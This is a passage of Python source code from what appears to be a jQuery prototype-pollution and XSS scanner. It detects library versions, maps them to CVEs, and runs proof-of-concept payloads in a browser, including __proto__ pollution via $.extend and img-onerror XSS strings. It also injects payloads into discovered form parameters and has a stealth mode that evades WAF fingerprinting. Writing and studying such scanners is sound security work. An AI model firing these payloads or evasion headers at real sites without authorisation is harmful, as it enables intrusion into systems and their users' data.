import time
import json
import urllib.parse
import re
import logging
import random
import traceback
from typing import Dict, List, Optional, Any
from datetime import datetime

# Local imports
from ppmap.utils import Colors, normalize_url, print_section
from ppmap.utils.rate_limit import rate_limited
from ppmap.utils.retry import retry_request
from ppmap.models.findings import Severity, VulnerabilityType, Finding
from ppmap.models.reports import ScanMetrics, ScanReport
from ppmap.config.settings import CONFIG, STEALTH_HEADERS
from ppmap.engine import EndpointDiscovery, ParameterDiscovery

# External optional imports handled safely
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.common.by import By
    from selenium.common.exceptions import (
        TimeoutException,
        WebDriverException,
        NoSuchElementException,
        StaleElementReferenceException,
        InvalidSessionIdException,
        UnexpectedAlertPresentException,
    )

    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

try:
    import requests
    from bs4 import BeautifulSoup

    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    from tqdm import tqdm
except ImportError:
    tqdm = None

from utils.gadgets import GADGET_PROPERTIES

# Import sub-modules
try:
    from ppmap.browser import get_browser
except Exception:
    get_browser = None


# Framework fingerprinting
try:
    from utils.fingerprint import (
        detect_frameworks,
        fingerprint_summary,
        get_priority_payloads,
    )
except ImportError:
    detect_frameworks = None

# Burp Suite Parser
try:
    from utils.burp_parser import (
        parse_burp_request,
        inject_pp_payload,
        compare_responses,
        get_sspp_payloads,
    )
except ImportError:
    parse_burp_request = None

logger = logging.getLogger(__name__)


def progress_iter(iterable, desc="Processing", disable=False):
    if tqdm is not None and not disable:
        return tqdm(
            iterable,
            desc=desc,
            ncols=80,
            leave=False,
            bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]",
        )
    return iterable


def safe_execute(func, *args, fallback=None, timeout=None, **kwargs):
    try:
        if timeout:
            from concurrent.futures import ThreadPoolExecutor

            with ThreadPoolExecutor(max_workers=1) as executor:
                future = executor.submit(func, *args, **kwargs)
                return future.result(timeout=timeout)
        else:
            return func(*args, **kwargs)
    except TimeoutError:
        logger.warning(f"Timeout executing {func.__name__}")
        return fallback
    except ConnectionError as e:
        logger.error(f"Connection error in {func.__name__}: {str(e)[:100]}")
        return fallback
    except Exception as e:
        logger.error(f"Error in {func.__name__}: {type(e).__name__}: {str(e)[:100]}")
        logger.debug(traceback.format_exc())
        return fallback


from ppmap.models.config import ScanConfig


def extract_jquery_versions_robust(page_source: str, driver=None) -> Dict[str, Any]:
    """
    Enhanced jQuery version detection with priority ordering.
    
    Detection methods (ordered by reliability):
    1. Dynamic: JavaScript execution (jQuery.fn.jquery) - Most accurate if page loads
    2. Script src attributes: <script src="jquery-X.Y.Z.js"> - Explicit version
    3. HTML patterns: Comments, inline scripts - Fallback
    
    Returns:
        {
            'dynamic': '3.3.1',  # From jQuery.fn.jquery execution
            'src_versions': [('1.11.3', 'https://...'), ...],  # From script src
            'pattern_versions': ['1.12.4'],  # From regex patterns
            'recommended': '1.11.3'  # Best guess for actual loaded version
        }
    """
    result = {
        'dynamic': None,
        'src_versions': [],
        'pattern_versions': [],
        'recommended': None,
        'all_versions': set(),
        'detection_method': None
    }
    
    # METHOD 1: Dynamic execution (most accurate)
    if driver:
        try:
            dynamic_version = driver.execute_script(
                "return (typeof jQuery !== 'undefined' ? jQuery.fn.jquery : "
                "(typeof window.jQuery !== 'undefined' ? window.jQuery.fn.jquery : "
                "(typeof $ !== 'undefined' && $.fn ? $.fn.jquery : null)));"
            )
            if dynamic_version:
                result['dynamic'] = dynamic_version
                result['all_versions'].add(dynamic_version)
                logger.debug(f"Dynamic jQuery version: {dynamic_version}")
        except Exception as e:
            logger.debug(f"Dynamic detection failed: {type(e).__name__}")
    
    # METHOD 2: Extract from script src attributes (most explicit)
    try:
        # Extract script tags with src attributes
        script_pattern = r'<script[^>]+src=["\']([^"\']*jquery[^"\']*)["\']'
        for match in re.finditer(script_pattern, page_source, re.IGNORECASE):
            src_url = match.group(1)
            # Extract version from URL: jquery-1.11.3.js, jquery.1-11-3.min.js, etc
            version_match = re.search(r'jquery[.-/]+([\d.]+)', src_url, re.IGNORECASE)
            if version_match:
                version = version_match.group(1).rstrip('.')  # Remove trailing dots
                # Validate version format (at least X.Y)
                if re.match(r'^\d+\.\d+', version):
                    result['src_versions'].append((version, src_url))
                    result['all_versions'].add(version)
                    logger.debug(f"Script src jQuery version: {version} from {src_url[:50]}")
    except Exception as e:
        logger.debug(f"Script src extraction failed: {e}")
    
    # METHOD 3: Regex patterns on page source
    try:
        patterns = [
            r'jquery[/-]([\d.]+)\.js',  # jquery-1.11.3.js or jquery/2.1.1.js
            r'jquery[.-]([\d.]+)',       # jquery-1.11.3 or jquery.2.1.1
            r'jQuery v([\d.]+)',         # jQuery v1.11.3
            r'jquery:\s*["\']?([\d.]+)["\']?',  # jquery: "1.11.3"
        ]
        for pattern in patterns:
            for match in re.finditer(pattern, page_source, re.IGNORECASE):
                version = match.group(1).rstrip('.')  # Remove trailing dots/dots
                # Validate version format (at least X.Y)
                if re.match(r'^\d+\.\d+', version):
                    result['pattern_versions'].append(version)
                    result['all_versions'].add(version)
                    logger.debug(f"Pattern match jQuery version: {version}")
    except Exception as e:
        logger.debug(f"Pattern extraction failed: {e}")
    
    # PRIORITY SELECTION
    # 1. If dynamic script execution worked, that's the actual loaded version
    if result['dynamic']:
        result['recommended'] = result['dynamic']
        result['detection_method'] = 'dynamic_execution'
    # 2. Prefer script src versions (explicit declarations) over patterns
    elif result['src_versions']:
        # Pick the one that appears first in HTML (likely the primary jQuery)
        result['recommended'] = result['src_versions'][0][0]
        result['detection_method'] = 'script_src'
    # 3. Use regex pattern matches (least reliable)
    elif result['pattern_versions']:
        # De-duplicate and sort, preferring older versions (more vulnerable)
        unique_patterns = sorted(list(set(result['pattern_versions'])))
        result['recommended'] = unique_patterns[0]
        result['detection_method'] = 'pattern_fallback'
    
    return result


class CompleteSecurityScanner:
    """Complete jQuery Prototype Pollution & XSS Scanner"""

    def __init__(self, config: Optional[ScanConfig] = None, **kwargs):
        # Fallback for backward compatibility inside tests or implicit calls
        if not config:
            self.config = ScanConfig(
                timeout=kwargs.get("timeout", 15),
                max_workers=kwargs.get("max_workers", 3),
                verify_ssl=kwargs.get("verify_ssl", True),
                oob_enabled=kwargs.get("oob_enabled", False),
                stealth=kwargs.get("stealth", False),
            )
        else:
            self.config = config

        self.timeout = self.config.timeout
        self.max_workers = self.config.max_workers
        self.stealth = self.config.stealth
        self.oob_enabled = self.config.oob_enabled
        self.oob_detector = None

        if self.oob_enabled:
            pass  # We will lazy init in test_blind_oob or main scan to avoid startup delay

        # Initialize session with proper headers to avoid WAF fingerprinting
        self.session = requests.Session()
        self.session.verify = self.config.verify_ssl

        if self.stealth:
            # Apply realistic browser headers so WAF sees a real browser
            self.session.headers.update(STEALTH_HEADERS)
            logger.info(
                "Stealth mode: applied realistic browser headers to HTTP session"
            )
        else:
            # Even without stealth, set a basic User-Agent to avoid python-requests fingerprint
            self.session.headers.update(
                {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Connection": "keep-alive",
                }
            )

        self.driver = None
        self.findings = []
        self.prototype_snapshot = None
        self.param_discovery = ParameterDiscovery(self.session)
        self.metrics = ScanMetrics(start_time=time.time())

    def snapshot_object_prototype(self):
        """Capture Object.prototype state"""
        try:
            snapshot_script = """
            return Object.getOwnPropertyNames(Object.prototype).reduce((acc, prop) => {
                try { acc[prop] = Object.prototype[prop]; } catch(e) {}
                return acc;
            }, {});
            """
            return self.driver.execute_script(snapshot_script)
        except Exception as e:
            logger.debug(f"Returning None due to error: {type(e).__name__} - {e}")
            return None

    def restore_object_prototype(self, snapshot):
        """Restore Object.prototype from snapshot"""
        if not snapshot:
            return
        try:
            restore_script = "Object.getOwnPropertyNames(Object.prototype).forEach(prop => { if (!window.__ppmap_protected) { delete Object.prototype[prop]; } });"
            self.driver.execute_script(restore_script)
        except Exception as e:
            logger.debug(f"Ignored error: {type(e).__name__} - {e}")

    def verify_cleanup(self, props_to_check=None):
        """Verify prototype cleanup"""
        try:
            verify_script = """
            const checked = arguments[0] || [];
            const polluted = checked.filter(prop => Object.prototype[prop] !== undefined);
            return { 'prototype_ok': polluted.length === 0, 'details': { 'prototype': polluted } };
            """
            return self.driver.execute_script(verify_script, props_to_check or [])
        except Exception as e:
            logger.debug(
                f"Returning {'prototype_ok': True} due to error: {type(e).__name__} - {e}"
            )
            return {"prototype_ok": True}

    def test_jquery_prototype_pollution(self) -> List[Dict[str, Any]]:
        """Test jQuery Prototype Pollution (CVE-2019-11358) with proper CVE detection"""
        print(f"{Colors.CYAN}[→] Testing jQuery Prototype Pollution...{Colors.ENDC}")

        findings: List[Dict[str, Any]] = []

        # Step 1: Detect jQuery version using ROBUST multi-method approach
        page_source = ""
        try:
            if hasattr(self, "driver") and self.driver:
                page_source = self.driver.page_source
        except Exception as e:
            logger.debug(f"Failed to get page source from driver: {e}")

        # Use robust detection function
        jquery_detection = extract_jquery_versions_robust(page_source, self.driver)
        jquery_version = jquery_detection.get('recommended')
        
        # Log all detected versions for debugging
        if jquery_detection.get('all_versions'):
            versions_str = ", ".join(sorted(jquery_detection['all_versions']))
            print(
                f"{Colors.BLUE}[*] jQuery versions detected: {versions_str} (Method: {jquery_detection.get('detection_method', 'unknown')}){Colors.ENDC}"
            )
            if jquery_detection.get('dynamic') and jquery_detection['dynamic'] != jquery_version:
                print(
                    f"{Colors.WARNING}[!] Dynamic load detected: {jquery_detection['dynamic']} (different from recommended {jquery_version}){Colors.ENDC}"
                )
        
        # Handle RequireJS as well (from page source)
        try:
            if page_source:
                requirejs_patterns = [
                    r"requirejs[/-]([\d]+\.[\d]+(?:\.[\d]+)?)",
                    r"require\.js.*?([\d]+\.[\d]+(?:\.[\d]+)?)",
                    r"RequireJS ([\d]+\.[\d]+(?:\.[\d]+)?)",
                ]
                for r_pat in requirejs_patterns:
                    r_match = re.search(r_pat, page_source, re.IGNORECASE)
                    if r_match:
                        r_ver = r_match.group(1)
                        print(
                            f"{Colors.BLUE}[*] RequireJS {r_ver} detected!{Colors.ENDC}"
                        )
                        try:
                            r_parts = [int(x) for x in r_ver.split(".")[:3]]
                            r_tuple = tuple(r_parts + [0] * (3 - len(r_parts)))
                            if r_tuple <= (2, 3, 6):
                                print(
                                    f"{Colors.FAIL}[!] VULNERABLE: RequireJS {r_ver} (CVE-2024-38999 - Prototype Pollution){Colors.ENDC}"
                                )
                                findings.append(
                                    {
                                        "type": "requirejs_pp",
                                        "cve": "CVE-2024-38999",
                                        "name": "RequireJS Prototype Pollution",
                                        "severity": "CRITICAL",
                                        "version": r_ver,
                                    }
                                )
                        except Exception as e:
                            logger.debug(f"RequireJS version check error: {e}")
                        break
        except Exception as e:
            logger.debug(f"RequireJS detection error: {e}")

        if not jquery_version:
            print(f"{Colors.GREEN}[✓] jQuery not detected{Colors.ENDC}")
            return findings

        # Step 2: CVE IDENTIFICATION
        # BUG-1 FIX: parse full (major, minor, patch) tuple for accurate version compare
        cve_vulnerabilities = []

        try:
            ver_parts = jquery_version.split(".")
            ver_tuple = tuple(int(x) for x in ver_parts[:3])
            # Pad to 3 elements
            while len(ver_tuple) < 3:
                ver_tuple = ver_tuple + (0,)
            major, minor, patch = ver_tuple

            # CVE-2019-11358: Prototype Pollution (jQuery < 3.5.0)
            if ver_tuple < (3, 5, 0):
                print(
                    f"{Colors.FAIL}[!] VULNERABLE to CVE-2019-11358 (Prototype Pollution){Colors.ENDC}"
                )
                print(f"    jQuery {jquery_version} < 3.5.0 is vulnerable!")
                cve_vulnerabilities.append(
                    {
                        "cve": "CVE-2019-11358",
                        "name": "Prototype Pollution in jQuery $.extend()",
                        "severity": "CRITICAL",
                        "jquery_version": jquery_version,
                    }
                )

            # CVE-2020-11022: HTML Prefilter XSS (jQuery < 3.5.0)
            if ver_tuple < (3, 5, 0):
                print(
                    f"{Colors.FAIL}[!] VULNERABLE to CVE-2020-11022 (HTML Prefilter XSS){Colors.ENDC}"
                )
                cve_vulnerabilities.append(
                    {
                        "cve": "CVE-2020-11022",
                        "name": "HTML Prefilter XSS in jQuery",
                        "severity": "HIGH",
                        "jquery_version": jquery_version,
                    }
                )

            # BUG-6 FIX CORRECTED: CVE-2020-11023 affects jQuery < 3.5.0 (NOT only == 3.5.0)
            # Original bug: `ver_tuple == (3, 5, 0)` missed all versions < 3.5.0 (including 1.12.4!)
            # See: https://nvd.nist.gov/vuln/detail/CVE-2020-11023 — affected: < 3.5.0
            if ver_tuple < (3, 5, 0):
                print(
                    f"{Colors.FAIL}[!] VULNERABLE to CVE-2020-11023 (<option> XSS in jQuery.html()){Colors.ENDC}"
                )
                cve_vulnerabilities.append(
                    {
                        "cve": "CVE-2020-11023",
                        "name": "jQuery.html() <option> element XSS",
                        "severity": "HIGH",
                        "jquery_version": jquery_version,
                        "description": "Unescaped HTML in <option> elements via .html()/.append() methods",
                    }
                )

            # CVE-2020-23064: XSS via DOM manipulation methods (jQuery < 3.5.0)
            # This CVE was completely missing from ppmap. Related to CVE-2020-11023:
            # .before(), .after(), .replaceWith(), etc. do not sanitize HTML input.
            # See: https://nvd.nist.gov/vuln/detail/CVE-2020-23064
            if ver_tuple < (3, 5, 0):
                print(
                    f"{Colors.FAIL}[!] VULNERABLE to CVE-2020-23064 (DOM Manipulation XSS){Colors.ENDC}"
                )
                cve_vulnerabilities.append(
                    {
                        "cve": "CVE-2020-23064",
                        "name": "jQuery DOM Manipulation XSS (.before/.after/.replaceWith)",
                        "severity": "HIGH",
                        "jquery_version": jquery_version,
                        "description": "Unsafe HTML passed to DOM manipulation methods executes scripts",
                    }
                )

            # CVE-2015-9251: Cross-domain AJAX auto-eval (jQuery < 3.0.0)
            # BUG FIX: Original range was `< (2, 2, 0)` — too narrow. Actual affected range: < 3.0.0
            # This CVE is about auto-eval of text/javascript AJAX responses, NOT CSS import.
            # See: https://nvd.nist.gov/vuln/detail/CVE-2015-9251
            if ver_tuple < (3, 0, 0):
                print(
                    f"{Colors.FAIL}[!] VULNERABLE to CVE-2015-9251 (Cross-domain AJAX auto-eval XSS){Colors.ENDC}"
                )
                cve_vulnerabilities.append(
                    {
                        "cve": "CVE-2015-9251",
                        "name": "jQuery Cross-domain AJAX auto-eval XSS",
                        "severity": "HIGH",
                        "jquery_version": jquery_version,
                        "description": "AJAX responses with Content-Type: text/javascript auto-eval via globalEval()",
                    }
                )

            # CVE-2012-6708: $.parseJSON XSS (jQuery < 1.9.0)
            if ver_tuple < (1, 9, 0):
                print(
                    f"{Colors.FAIL}[!] VULNERABLE to CVE-2012-6708 ($.parseJSON XSS){Colors.ENDC}"
                )
                cve_vulnerabilities.append(
                    {
                        "cve": "CVE-2012-6708",
                        "name": "jQuery $.parseJSON XSS",
                        "severity": "MEDIUM",
                        "jquery_version": jquery_version,
                    }
                )

        except Exception as e:
            print(f"{Colors.WARNING}[⚠] CVE version check error: {e}{Colors.ENDC}")
            logger.debug(f"CVE version check error detail: {e}")

        # BUG-8 FIX: Don't extend findings here — browser-verified step below will add
        # them with 'verified' flag to avoid duplicates. Only add if no browser available.
        # findings.extend(cve_vulnerabilities)  <- REMOVED: caused triple duplicates

        # Step 3: Snapshot Object.prototype before testing
        try:
            self.prototype_snapshot = self.snapshot_object_prototype()
        except Exception:
            self.prototype_snapshot = None

        # Step 4: jQuery $.extend() vulnerability test (CVE-2019-11358)
        if cve_vulnerabilities:  # Only if version vulnerable
            rand_id = f"pp_{int(time.time())}"

            js_check = f"""
            try {{
                $.extend(true, {{}}, JSON.parse('{{"__proto__": {{"{rand_id}": true}}}}'));
                var result = Object.prototype.{rand_id} === true;
                delete Object.prototype.{rand_id};
                return result;
            }} catch(e) {{ return false; }}
            """

            try:
                if self.driver.execute_script(js_check):
                    print(
                        f"{Colors.FAIL}[!] $.extend() confirms Prototype Pollution vulnerability!{Colors.ENDC}"
                    )
                    findings.append(
                        {
                            "type": "jquery_pp_verified",
                            "name": "jQuery $.extend() Prototype Pollution VERIFIED",
                            "severity": "CRITICAL",
                            "cve": "CVE-2019-11358",
                            "jquery_version": jquery_version,
                            "verified": True,
                        }
                    )
            except Exception as e:
                logger.debug(f"Ignored error: {type(e).__name__} - {e}")

        # Step 5: Browser-based XSS verification tests per CVE
        # Run each CVE's specific payload independently for accurate reporting
        # ------------------------------------------------------------------

        # CVE-2020-11022: HTML Prefilter bypass via <style> + <img onerror>
        # BUG FIX: Old payload `<option><style></option><img onerror>` is actually CVE-2020-11023.
        # CVE-2020-11022 specific: bypass htmlPrefilter regex using self-closing style tag.
        if any(c["cve"] == "CVE-2020-11022" for c in cve_vulnerabilities):
            m = f"cve11022_{int(time.time())}"
            js_11022 = f"""
            try {{
                window.{m} = false;
                var el = $('<div>').css('display','none').appendTo('body');
                el.html('<style></style><img src=x onerror="window.{m}=true">');
                var r = window.{m} === true;
                el.remove(); delete window.{m};
                return r;
            }} catch(e) {{ return false; }}
            """
            try:
                if self.driver.execute_script(js_11022):
                    print(
                        f"{Colors.FAIL}[!] CVE-2020-11022 VERIFIED: htmlPrefilter bypass XSS executed!{Colors.ENDC}"
                    )
                    findings.append(
                        {
                            "type": "jquery_xss_verified",
                            "name": "jQuery htmlPrefilter XSS (VERIFIED)",
                            "severity": "HIGH",
                            "cve": "CVE-2020-11022",
                            "jquery_version": jquery_version,
                            "verified": True,
                            "description": "jQuery .html() htmlPrefilter regex bypassed via <style></style><img onerror>",
                            "poc": f"$('<div>').appendTo('body').html('<style></style><img src=x onerror=alert(1)>')",
                        }
                    )
                else:
                    print(
                        f"{Colors.YELLOW}[*] CVE-2020-11022: Version vulnerable, XSS payload did not execute (CSP or sandbox may block){Colors.ENDC}"
                    )
            except Exception as e:
                logger.debug(f"CVE-2020-11022 browser test error: {e}")

        # CVE-2020-11023: <option> element XSS
        # The <option><style></option><img onerror> pattern is specific to this CVE.
        if any(c["cve"] == "CVE-2020-11023" for c in cve_vulnerabilities):
            m = f"cve11023_{int(time.time())}"
            js_11023 = f"""
            try {{
                window.{m} = false;
                var el = $('<select>').css('display','none').appendTo('body');
                el.html('<option><img src=x onerror="window.{m}=true"></option>');
                var r = window.{m} === true;
                el.remove(); delete window.{m};
                return r;
            }} catch(e) {{ return false; }}
            """
            try:
                if self.driver.execute_script(js_11023):
                    print(
                        f"{Colors.FAIL}[!] CVE-2020-11023 VERIFIED: <option> element XSS executed!{Colors.ENDC}"
                    )
                    findings.append(
                        {
                            "type": "jquery_xss_verified",
                            "name": "jQuery <option> element XSS (VERIFIED)",
                            "severity": "HIGH",
                            "cve": "CVE-2020-11023",
                            "jquery_version": jquery_version,
                            "verified": True,
                            "description": "jQuery .html() does not sanitize <option><img onerror> combination",
                            "poc": "$('<select>').appendTo('body').html('<option><img src=x onerror=alert(1)></option>')",
                        }
                    )
                else:
                    print(
                        f"{Colors.YELLOW}[*] CVE-2020-11023: Version vulnerable, <option> XSS payload did not execute{Colors.ENDC}"
                    )
            except Exception as e:
                logger.debug(f"CVE-2020-11023 browser test error: {e}")

        # CVE-2020-23064: DOM manipulation XSS via .append() with raw img
        # Tests .append() without prior sanitization — sibling of CVE-2020-11023
        if any(c["cve"] == "CVE-2020-23064" for c in cve_vulnerabilities):
            m = f"cve23064_{int(time.time())}"
            js_23064 = f"""
            try {{
                window.{m} = false;
                var el = $('<div>').css('display','none').appendTo('body');
                el.append('<img/><img src=x onerror="window.{m}=true">');
                var r = window.{m} === true;
                el.remove(); delete window.{m};
                return r;
            }} catch(e) {{ return false; }}
            """
            try:
                if self.driver.execute_script(js_23064):
                    print(
                        f"{Colors.FAIL}[!] CVE-2020-23064 VERIFIED: DOM manipulation XSS executed via .append()!{Colors.ENDC}"
                    )
                    findings.append(
                        {
                            "type": "jquery_xss_verified",
                            "name": "jQuery DOM Manipulation XSS (VERIFIED)",
                            "severity": "HIGH",
                            "cve": "CVE-2020-23064",
                            "jquery_version": jquery_version,
                            "verified": True,
                            "description": "jQuery .append() does not sanitize <img/><img onerror> combination",
                            "poc": "$('<div>').appendTo('body').append('<img/><img src=x onerror=alert(1)>')",
                        }
                    )
                else:
                    print(
                        f"{Colors.YELLOW}[*] CVE-2020-23064: Version vulnerable, DOM XSS payload did not execute{Colors.ENDC}"
                    )
            except Exception as e:
                logger.debug(f"CVE-2020-23064 browser test error: {e}")

        # CVE-2015-9251: Check if AJAX text/javascript auto-eval converter is active
        # This checks for the presence of the vulnerable converter in jQuery's settings.
        # Full exploitation requires cross-domain AJAX, but we can verify the converter exists.
        if any(c["cve"] == "CVE-2015-9251" for c in cve_vulnerabilities):
            js_9251 = """
            try {
                var conv = jQuery && jQuery.ajaxSettings && jQuery.ajaxSettings.converters;
                return conv && typeof conv["text script"] === 'function';
            } catch(e) { return false; }
            """
            try:
                if self.driver.execute_script(js_9251):
                    print(
                        f"{Colors.FAIL}[!] CVE-2015-9251 VERIFIED: text/javascript auto-eval converter ACTIVE in jQuery!{Colors.ENDC}"
                    )
                    findings.append(
                        {
                            "type": "jquery_xss_verified",
                            "name": "jQuery AJAX auto-eval converter Active (CVE-2015-9251)",
                            "severity": "MEDIUM",
                            "cve": "CVE-2015-9251",
                            "jquery_version": jquery_version,
                            "verified": True,
                            "description": 'jQuery.ajaxSettings.converters["text script"] = globalEval is active. '
                            "Cross-domain AJAX responses with Content-Type: text/javascript will be auto-eval'd.",
                            "poc": 'typeof jQuery.ajaxSettings.converters["text script"] === "function"  // returns true',
                        }
                    )
                else:
                    print(
                        f"{Colors.YELLOW}[*] CVE-2015-9251: Converter not active or jQuery not accessible{Colors.ENDC}"
                    )
            except Exception as e:
                logger.debug(f"CVE-2015-9251 browser test error: {e}")

        # Restore snapshot if available
        try:
            if self.prototype_snapshot:
                self.restore_object_prototype(self.prototype_snapshot)
        except Exception as e:
            logger.debug(f"Ignored error: {type(e).__name__} - {e}")

        # BUG-8 FIX: If no browser-verified findings but CVEs detected by version, report them
        if not findings and cve_vulnerabilities:
            # Add version-based CVE findings (not browser-verified)
            findings.extend(cve_vulnerabilities)

        if not findings:
            print(f"{Colors.GREEN}[✓] No jQuery vulnerabilities detected{Colors.ENDC}")
        else:
            print(
                f"{Colors.FAIL}[!] Total jQuery CVEs found: {len(findings)}{Colors.ENDC}"
            )

        return findings

    @rate_limited()
    def test_xss_with_details(self, base_url) -> List[Dict[str, Any]]:
        """Test XSS vulnerabilities with execution-based verification (NOT text search)"""
        print(f"{Colors.CYAN}[→] Testing XSS payloads...{Colors.ENDC}")

        findings: List[Dict[str, Any]] = []

        # Discover parameters dynamically from HTML forms
        print(f"{Colors.BLUE}[*] Discovering parameters from forms...{Colors.ENDC}")
        test_params = self.param_discovery.analyze_forms(base_url)

        if test_params:
            print(
                f"{Colors.GREEN}[✓] Discovered {len(test_params)} parameters: {', '.join(test_params[:5])}{Colors.ENDC}"
            )
        else:
            print(
                f"{Colors.YELLOW}[!] No parameters found, using defaults{Colors.ENDC}"
            )
            test_params = ["q", "search", "query", "id", "name"]

        # Limit to first 5 parameters to avoid timeout
        test_params = test_params[:5]

        # Use execution-based XSS detection, not text search!
        iterator = (
            tqdm(test_params, desc="Testing XSS Params", unit="param")
            if tqdm
            else test_params
        )
        for param in iterator:
            for payload in CONFIG["xss_payloads"][:2]:
                # Create a unique marker that will be set if XSS is executed
                marker = f"xss_success_{int(time.time() * 1000)}"

                # Modify payload to set a global flag if executed
                js_payload = f"""
                    window.{marker} = false;
                    var d = document.createElement('div');
                    d.style.display = 'none';
                    document.body.appendChild(d);
                    try {{
                        d.innerHTML = "{payload.replace('"', '\\"')}";
                        // Check if script executed or event fired
                        if (window['{marker}'] === true) {{
                            d.remove();
                            window['{marker}'] = true;
                        }} else {{
                            // Try with different method
                            var result = d.innerHTML.includes("alert") || d.innerHTML.includes("onerror");
                            d.remove();
                            window['{marker}'] = result;
                        }}
                    }} catch(e) {{
                        d.remove();
                    }}
                    return window['{marker}'];
                """

                if "?" in base_url:
                    test_url = (
                        f"{base_url}&{param}={urllib.parse.quote(payload, safe='')}"
                    )
                else:
                    test_url = (
                        f"{base_url}?{param}={urllib.parse.quote(payload, safe='')}"
                    )

                # Retry loop to handle navigation errors
                for attempt in range(3):
                    try:
                        self.driver.get(test_url)
                        self.metrics.total_requests += 1
                        time.sleep(1 + attempt)  # Increase wait on retry

                        # Execute JavaScript to verify XSS
                        try:
                            js_exploit = f"""
                            try {{
                                window.xss_test = false;
                                var container = document.createElement('div');
                                container.style.display = 'none';
                                document.body.appendChild(container);
                                container.innerHTML = "{payload.replace('"', '\\"')}";
                                var result = window.xss_test === true;
                                container.remove();
                                return result;
                            }} catch(e) {{ return false; }}
                            """

                            if self.driver.execute_script(js_exploit):
                                print(
                                    f"{Colors.FAIL}[!] XSS FOUND: {param}={payload[:40]}{Colors.ENDC}"
                                )
                                findings.append(
                                    {
                                        "type": "xss",
                                        "param": param,
                                        "payload": payload,
                                        "severity": "HIGH",
                                        "url": test_url,
                                    }
                                )
                                break  # Found, no need to retry or continue with this payload? Actually continue to find more?
                                # If found, we break the retry loop, but continue the loop over payloads?
                                # No, if found we can stop testing this param with this payload.

                            # If we get here, execution successful but no XSS, or XSS not triggered.
                            # Break retry loop as page loaded fine.
                            break

                        except UnexpectedAlertPresentException:
                            print(
                                f"{Colors.FAIL}[!] XSS FOUND (Alert Triggered): {param}={payload[:40]}{Colors.ENDC}"
                            )
                            findings.append(
                                {
                                    "type": "xss",
                                    "param": param,
                                    "payload": payload,
                                    "severity": "HIGH",
                                    "url": test_url,
                                }
                            )
                            # Handle alert cleanup via Selenium if possible, or just break
                            try:
                                self.driver.switch_to.alert.accept()
                            except:
                                pass
                            break
                        except Exception as exec_e:
                            # Fallback: check if payload appears to be reflected in DOM
                            try:
                                page_source = self.driver.page_source
                                # Only mark as XSS if payload is reflected AND contains executable pattern
                                if payload in page_source and (
                                    "<script" in payload
                                    or "onerror" in payload
                                    or "onload" in payload
                                ):
                                    print(
                                        f"{Colors.WARNING}[⚠] Potential XSS: {param}={payload[:40]} (reflected in page){Colors.ENDC}"
                                    )
                                break
                            except:
                                pass

                            # If execute_script failed with navigation error, it bubbles up to outer except
                            raise exec_e

                    except Exception as e:
                        err_msg = str(e)
                        if (
                            "aborted by navigation" in err_msg
                            or "Connection reset" in err_msg
                            or "browsing context has been discarded" in err_msg
                        ):
                            if attempt < 2:
                                # print(f"{Colors.YELLOW}[~] Retry {attempt+1}/3 for {param} due to navigation error...{Colors.ENDC}")
                                continue
                        else:
                            print(
                                f"{Colors.WARNING}[⚠] Error testing {param}: {err_msg[:50]}{Colors.ENDC}"
                            )
                            break

        if not findings:
            print(f"{Colors.GREEN}[✓] No confirmed XSS detected{Colors.ENDC}")
        return findings

    @rate_limited()
    @retry_request(
        max_attempts=3, backoff=1.5, exceptions=(TimeoutException, WebDriverException)
    )
    def test_post_parameters(self, base_url) -> List[Dict[str, Any]]:
        """Test POST parameters for XSS and PP vulnerabilities"""
        print(f"{Colors.CYAN}[→] Testing POST parameters...{Colors.ENDC}")

        findings: List[Dict[str, Any]] = []

        try:
            # Discover which forms use POST
            self.driver.get(base_url)
            time.sleep(1)

            # Find POST forms
            forms = json.loads(self.driver.execute_script("""
                return JSON.stringify(Array.from(document.querySelectorAll('form')).map(form => ({
                    method: (form.method || 'GET').toUpperCase(),
                    action: form.action || window.location.pathname,
                    inputs: Array.from(form.querySelectorAll('input, textarea')).map(inp => ({
                        name: inp.name,
                        type: inp.type,
                        value: inp.value
                    }))
                })));
            """))

            if not forms:
                print(f"{Colors.YELLOW}[!] No POST forms found{Colors.ENDC}")
                return findings

            # Test each POST form
            for form_idx, form in enumerate(forms):
                if form["method"] != "POST":
                    continue

                print(
                    f"{Colors.BLUE}[*] Testing POST form #{form_idx + 1}{Colors.ENDC}"
                )

                # Extract parameter names
                post_params = [inp["name"] for inp in form["inputs"] if inp["name"]]

                if not post_params:
                    continue

                # Test each parameter with XSS payload
                for param in post_params[:3]:  # Limit to first 3 POST params
                    for payload in CONFIG["xss_payloads"][
                        :1
                    ]:  # Test only first payload for POST
                        marker = f"post_xss_{int(time.time() * 1000)}"

                        try:
                            # Execute POST via JavaScript
                            post_script = f"""
                            return new Promise(resolve => {{
                                window.{marker} = false;
                                
                                const form = document.querySelector('form');
                                if (form) {{
                                    const input = form.querySelector('input[name="{param}"]') || document.createElement('input');
                                    input.value = "{payload.replace('"', '\\"')}";
                                    
                                    // Create hidden container to check execution
                                    const container = document.createElement('div');
                                    container.style.display = 'none';
                                    container.innerHTML = input.value;
                                    document.body.appendChild(container);
                                    
                                    // Check if payload executed
                                    setTimeout(() => {{
                                        container.remove();
                                        resolve(window.{marker} === true);
                                    }}, 500);
                                }} else {{
                                    resolve(false);
                                }}
                            }});
                            """

                            result = self.driver.execute_script(post_script)
                            if result:
                                print(
                                    f"{Colors.FAIL}[!] POST XSS FOUND: {param}={payload[:40]}{Colors.ENDC}"
                                )
                                findings.append(
                                    {
                                        "type": "post_xss",
                                        "param": param,
                                        "payload": payload,
                                        "severity": "HIGH",
                                        "method": "POST",
                                    }
                                )
                        except UnexpectedAlertPresentException:
                            print(f"{Colors.FAIL}[!] POST XSS FOUND (Alert Triggered): {param}={payload[:40]}{Colors.ENDC}")
                            findings.append(
                                {
                                    "type": "post_xss",
                                    "param": param,
                                    "payload": payload,
                                    "severity": "HIGH",
                                    "method": "POST",
                                }
                            )
                            try:
